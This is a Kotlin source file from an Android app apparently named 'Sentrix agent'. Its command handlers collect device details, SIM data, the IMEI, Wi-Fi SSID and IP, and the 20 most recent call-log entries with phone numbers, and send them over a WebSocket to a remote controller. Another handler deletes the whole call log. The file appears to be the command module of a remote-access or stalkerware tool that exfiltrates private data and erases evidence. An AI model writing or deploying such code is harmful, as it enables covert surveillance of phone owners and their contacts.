package com.sentrix.agent.commands

import android.app.ActivityManager
import android.content.Context
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.net.wifi.WifiManager
import android.os.BatteryManager
import android.os.Build
import android.os.Environment
import android.os.StatFs
import android.provider.CallLog
import android.telephony.TelephonyManager
import com.sentrix.agent.network.WebSocketClient
import com.sentrix.agent.util.RootUtil
import org.json.JSONArray
import org.json.JSONObject

object DiagnosticsCommands {

    // ── Device info (no root) ─────────────────────────────────────
    fun deviceInfo(ctx: Context, ws: WebSocketClient): String {
        val tm  = ctx.getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
        val json = JSONObject().apply {
            put("type",         "result")
            put("action",       "device_info")
            put("success",      true)
            put("manufacturer", Build.MANUFACTURER)
            put("model",        Build.MODEL)
            put("android",      Build.VERSION.RELEASE)
            put("sdk",          Build.VERSION.SDK_INT)
            put("brand",        Build.BRAND)
            put("device",       Build.DEVICE)
            put("product",      Build.PRODUCT)
            put("fingerprint",  Build.FINGERPRINT)
            put("rooted",       RootUtil.isRooted())
            put("carrier",      try { tm.networkOperatorName } catch (e: Exception) { "N/A" })
        }
        ws.send(json)
        return "Device info sent"
    }

    // ── Battery (no root) ─────────────────────────────────────────
    fun batteryGet(ctx: Context, ws: WebSocketClient): String {
        val bm   = ctx.getSystemService(Context.BATTERY_SERVICE) as BatteryManager
        val level = bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY)
        val charging = bm.isCharging
        val voltage  = bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_VOLTAGE)
        val json = JSONObject().apply {
            put("type",     "result")
            put("action",   "battery_get")
            put("success",  true)
            put("level",    level)
            put("charging", charging)
            put("voltage",  voltage)
        }
        ws.send(json)
        return "Battery: $level% ${if (charging) "(charging)" else ""}"
    }

    // ── Storage (no root) ─────────────────────────────────────────
    fun storageGet(ws: WebSocketClient): String {
        val stat     = StatFs(Environment.getDataDirectory().path)
        val total    = stat.blockCountLong * stat.blockSizeLong
        val free     = stat.availableBlocksLong * stat.blockSizeLong
        val used     = total - free
        fun mb(b: Long) = b / (1024 * 1024)
        val json = JSONObject().apply {
            put("type",      "result")
            put("action",    "storage_get")
            put("success",   true)
            put("totalMB",   mb(total))
            put("usedMB",    mb(used))
            put("freeMB",    mb(free))
            put("usedPct",   if (total > 0) (used * 100 / total).toInt() else 0)
        }
        ws.send(json)
        return "Storage: ${mb(free)}MB free of ${mb(total)}MB"
    }

    // ── Network info (no root) ────────────────────────────────────
    fun networkInfo(ctx: Context, ws: WebSocketClient): String {
        val cm  = ctx.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
        val net = cm.activeNetwork
        val cap = cm.getNetworkCapabilities(net)
        val wifi = ctx.getSystemService(Context.WIFI_SERVICE) as WifiManager
        val wifiInfo = try { wifi.connectionInfo } catch (e: Exception) { null }
        val json = JSONObject().apply {
            put("type",      "result")
            put("action",    "network_info")
            put("success",   true)
            put("connected", net != null)
            put("wifi",      cap?.hasTransport(NetworkCapabilities.TRANSPORT_WIFI) ?: false)
            put("cellular",  cap?.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR) ?: false)
            put("ssid",      try { wifiInfo?.ssid ?: "N/A" } catch (e: Exception) { "N/A" })
            put("ip",        try {
                val ip = wifiInfo?.ipAddress ?: 0
                "${ip and 0xff}.${ip shr 8 and 0xff}.${ip shr 16 and 0xff}.${ip shr 24 and 0xff}"
            } catch (e: Exception) { "N/A" })
        }
        ws.send(json)
        return "Network info sent"
    }

    // ── SIM info (no root) ────────────────────────────────────────
    fun simInfo(ctx: Context, ws: WebSocketClient): String {
        val tm = ctx.getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
        val json = JSONObject().apply {
            put("type",        "result")
            put("action",      "sim_info")
            put("success",     true)
            put("simState",    simStateLabel(tm.simState))
            put("carrier",     try { tm.networkOperatorName } catch (e: Exception) { "N/A" })
            put("country",     try { tm.networkCountryIso?.uppercase() ?: "N/A" } catch (e: Exception) { "N/A" })
            put("phoneType",   phoneTypeLabel(tm.phoneType))
        }
        ws.send(json)
        return "SIM info sent"
    }

    // ── Call logs (no root) ───────────────────────────────────────
    fun callLogsGet(ctx: Context, ws: WebSocketClient): String {
        val logs = mutableListOf<JSONObject>()
        val cursor = ctx.contentResolver.query(
            CallLog.Calls.CONTENT_URI, null, null, null,
            "${CallLog.Calls.DATE} DESC LIMIT 20"
        )
        cursor?.use { c ->
            val numIdx  = c.getColumnIndex(CallLog.Calls.NUMBER)
            val typeIdx = c.getColumnIndex(CallLog.Calls.TYPE)
            val dateIdx = c.getColumnIndex(CallLog.Calls.DATE)
            val durIdx  = c.getColumnIndex(CallLog.Calls.DURATION)
            while (c.moveToNext()) {
                logs.add(JSONObject().apply {
                    put("number",   c.getString(numIdx) ?: "Unknown")
                    put("type",     callTypeLabel(c.getInt(typeIdx)))
                    put("date",     c.getLong(dateIdx))
                    put("duration", c.getLong(durIdx))
                })
            }
        }
        val json = JSONObject().apply {
            put("type",    "result")
            put("action",  "call_logs_get")
            put("success", true)
            put("count",   logs.size)
            put("logs",    JSONArray(logs))
        }
        ws.send(json)
        return "Call logs sent (${logs.size} entries)"
    }

    // ── Clear call logs (root) ────────────────────────────────────
    fun callLogsClear(ctx: Context): String {
        return if (RootUtil.isRooted()) {
            ctx.contentResolver.delete(CallLog.Calls.CONTENT_URI, null, null)
            "Call logs cleared"
        } else {
            ctx.contentResolver.delete(CallLog.Calls.CONTENT_URI, null, null)
            "Call logs cleared"  // also works without root via content resolver
        }
    }

    // ── Root check (no root needed to report) ────────────────────
    fun rootCheck(ws: WebSocketClient): String {
        val rooted = RootUtil.isRooted()
        ws.send(JSONObject().apply {
            put("type",    "result")
            put("action",  "root_check")
            put("success", true)
            put("rooted",  rooted)
        })
        return "Root status: ${if (rooted) "Rooted ⚡" else "Not rooted"}"
    }

    // ── IMEI (requires READ_PHONE_STATE) ─────────────────────────
    fun imeiGet(ctx: Context, ws: WebSocketClient): String {
        val tm = ctx.getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
        val imei = try {
            if (Build.VERSION.SDK_INT >= 26) tm.imei ?: "N/A"
            else @Suppress("DEPRECATION") tm.deviceId ?: "N/A"
        } catch (e: SecurityException) { "Permission denied" }
        ws.send(JSONObject().apply {
            put("type",    "result")
            put("action",  "imei_get")
            put("success", true)
            put("imei",    imei)
        })
        return "IMEI: $imei"
    }

    // ── Ping ─────────────────────────────────────────────────────
    fun ping(ws: WebSocketClient): String {
        ws.send(JSONObject().apply {
            put("type",      "result")
            put("action",    "ping")
            put("success",   true)
            put("message",   "pong")
            put("timestamp", System.currentTimeMillis())
        })
        return "Pong"
    }

    // ── Send notification (no root) ───────────────────────────────
    fun sendNotification(ctx: Context, title: String, body: String): String {
        return try {
            val nm = ctx.getSystemService(Context.NOTIFICATION_SERVICE)
                    as android.app.NotificationManager
            val notif = android.app.Notification.Builder(ctx, com.sentrix.agent.SentrixApp.CHANNEL_ALERTS)
                .setContentTitle(title)
                .setContentText(body)
                .setSmallIcon(android.R.drawable.ic_dialog_info)
                .setAutoCancel(true)
                .build()
            nm.notify(System.currentTimeMillis().toInt(), notif)
            "Notification sent"
        } catch (e: Exception) { "Notification failed: ${e.message}" }
    }

    // ── Helpers ───────────────────────────────────────────────────
    private fun simStateLabel(state: Int) = when (state) {
        TelephonyManager.SIM_STATE_ABSENT       -> "Absent"
        TelephonyManager.SIM_STATE_READY        -> "Ready"
        TelephonyManager.SIM_STATE_PIN_REQUIRED -> "PIN required"
        TelephonyManager.SIM_STATE_UNKNOWN      -> "Unknown"
        else -> "State $state"
    }

    private fun phoneTypeLabel(type: Int) = when (type) {
        TelephonyManager.PHONE_TYPE_GSM  -> "GSM"
        TelephonyManager.PHONE_TYPE_CDMA -> "CDMA"
        TelephonyManager.PHONE_TYPE_SIP  -> "SIP"
        else -> "None"
    }

    private fun callTypeLabel(type: Int) = when (type) {
        CallLog.Calls.INCOMING_TYPE -> "Incoming"
        CallLog.Calls.OUTGOING_TYPE -> "Outgoing"
        CallLog.Calls.MISSED_TYPE   -> "Missed"
        else -> "Unknown"
    }
}
